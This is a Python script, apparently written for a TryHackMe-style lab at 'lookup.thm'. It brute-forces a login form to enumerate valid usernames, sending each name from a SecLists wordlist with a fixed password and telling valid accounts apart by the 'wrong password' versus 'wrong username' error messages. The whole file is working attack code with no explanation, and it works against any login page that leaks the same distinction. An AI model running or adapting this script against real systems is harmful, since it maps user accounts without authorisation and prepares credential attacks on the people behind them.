import requests

# Define the target URL
url = "http://lookup.thm/login.php"
print(f"[+] Target URL set to: {url}")

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"
print(f"[+] Using username list from: {file_path}")

try:
    with open(file_path, "r") as file:
        print("[+] File opened successfully, starting brute force...")

        for line_number, line in enumerate(file, start=1):
            username = line.strip()
            if not username:
                print(f"[-] Skipping empty line {line_number}")
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }
            print(f"[~] Trying username: {username} (line {line_number})")

            try:
                # Send the POST request
                response = requests.post(url, data=data)
                response_text = response.text.lower()  # Normalize case for matching
                
                # Check the response content
                if "wrong password" in response_text:
                    print(f"[+] Username found: {username} (Password is incorrect)")
                elif "wrong username" in response_text:
                    print(f"[-] Invalid username: {username}")
                else:
                    print(f"[!] Unexpected response for {username}: {response_text[:100]}")
            
            except requests.RequestException as req_err:
                print(f"[X] HTTP request failed for {username}: {req_err}")
                
except FileNotFoundError:
    print(f"[X] Error: The file {file_path} does not exist.")
except Exception as e:
    print(f"[X] Unexpected error: {e}")
